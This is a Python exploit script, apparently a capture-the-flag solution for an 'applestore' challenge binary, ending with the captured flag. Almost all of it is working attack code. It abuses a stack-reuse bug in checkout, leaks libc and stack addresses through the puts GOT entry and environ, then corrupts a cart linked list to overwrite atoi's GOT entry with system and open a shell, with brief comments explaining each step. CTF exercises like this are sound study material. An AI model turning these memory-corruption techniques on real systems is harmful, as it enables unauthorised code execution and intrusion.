#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

exe = context.binary = ELF('./applestore_patched', checksec=False)
libc = ELF("./libc_32.so.6", checksec=False)

gdbscript = '''
init-pwndbg
# init-gef-bata
file ./applestore_patched
c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            sleep(1)
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

def list():
	sa(b'>', b'1')

def add(idx):
	sa(b'>', b'2')
	sa(b'> ', idx)

def delete(idx):
	sa(b'>', b'3')
	sa(b'Item Number> ', idx)

def cart(confirmation):
	sa(b'>', b'4')
	sa(b'> ', confirmation)

def checkout():
	sa(b'>', b'5')
	sa(b'> ', b'y')

def construct_payload(name, prize=0, fd=0, bk=0):
    return p32(name) + p32(prize) + p32(fd) + p32(bk)

# ==================== EXPLOIT ====================
p = start()

# The vulnerability is in the `checkout` function. Our new phone is created on the stack
# not heap (which always ebp-0x20 in all cases). And because the program run a while loop, the stack frame will be reused.

# To trigger the vulnerability, we first need to match the condition of the `checkout` function, which is `total == 0x1c06`
# which total is the sum of the price of the items in the cart that we added

for _ in range(10):
    add(b'4')

for _ in range(16):
    add(b'1')

checkout()

cart(b'y\x00' + construct_payload(exe.got.puts))
ru(b'27: ')
libc.address = u32(rb(4)) - libc.sym.puts
info("libc base @ %#x", libc.address)

cart(b'y\x00' + construct_payload(libc.sym.environ))
ru(b'27: ')
stack_addr = u32(rb(4))
slog('stack addr @ %#x', stack_addr)
saved_ebp = stack_addr - 260
info('saved ebp @ %#x', saved_ebp)

delete(b'27' + construct_payload(0x8048f98, 0, saved_ebp - 0xc, exe.got.atoi + 0x22 - 0x4))
sla(b'> ', b'sh\x00\x00' + p32(libc.sym.system))

interactive(flag=False)
# FLAG{I_th1nk_th4t_you_c4n_jB_1n_1ph0n3_8}
